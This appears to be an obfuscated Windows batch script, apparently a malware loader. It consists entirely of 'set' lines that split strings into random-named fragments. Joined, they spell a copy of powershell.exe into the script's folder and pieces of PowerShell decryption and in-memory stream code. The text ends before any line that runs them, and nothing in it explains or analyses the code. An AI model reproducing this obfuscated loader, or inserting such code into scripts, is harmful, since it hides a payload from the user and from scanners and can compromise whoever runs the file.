@echo off
set "OYjlRGXQGD=we"
set "UinNAdGrxw=he"
set "iDIHjGfePN=po"
set "ReJAAKseZH=he"
set "nbMjnFLvKO=1."
set "wZBLyoSaOq=nd"
set "uEfhPUgJMU=\W"
set "BTtHBqVwqx=s\"
set "IGMJUGaHwb=st"
set "nXoOiOPFhT=we"
set "AGGWAbrDbZ=ll"
set "nodjXMQJcJ=\v"
set "YDCYbHVSvB=rs"
set "GqDgDFaKGC=.e"
set "HlBVhAGAal=:\"
set "IntwHXACRY= C"
set "qoZoIZSaIX=in"
set "svJqgGYRiS=32"
set "aOGpAmWwCn=do"
set "ZGskNwVLZC=0\"
set "KmIoWinNoy=xe"
set "pVyiYhtuSJ=py"
set "PBOvzJZnMa=ll"
set "vLFAsrXGxZ= /"
set "BlwvoRdiIg=co"
set "xWipRdwuHh=Po"
set "YKgymiQvIx=rS"
set "PkRCQDGUjh=em"
set "prRvUABDXU=y "
set "IiyEGleJMV=ws"
set "hrrWgjNRar=Wi"
set "qArKzeuCax=ow"
set "jJCzBHJQwT=Sy"
set "NhvBqgvuGj= %~dp0"
set "NUPQHDzJSb=cd"
set "daSfZjtyUa=$inw"
set "KqlrsgoMvZ=dJ, "
set "FflOQAfCWD=y]::"
set "XfqvUaTXLO=.Mod"
set "mkARBBHVEi=$LdW"
set "PHSjkWHoIs=.Sec"
set "GrRHHQXbIV=3); "
set "urmQuXpFHe=ay()"
set "WHjkjmBhly=kpJU"
set "KOAosAmiRE=gth)"
set "fOmNJVLPhe=tryP"
set "jrRlfrDNlZ=tion"
set "nfPLSaYVoo=mory"
set "dHcrSKDcek=y.Ci"
set "cDXleLaKGC=dV1k"
set "fMArAVpUKH=J.Su"
set "aMRZuKFeNA= [st"
set "UzyGpVHRne=AqO."
set "GXRnhxgUDl=UU);"
set "AzsSMzQlHR=tem."
set "pgodaOWvzf=O.Me"
set "FKmiSjkrwz=pose"
set "ITfIsyDBCB=stem"
set "IDMadbmJbq=DNJS"
set "CixXxLPBKd=lAZd"
set "YQXWjhHArE=g = "
set "VdYKRoNoFk=Syst"
set "wUvLDDBnAE=();$"
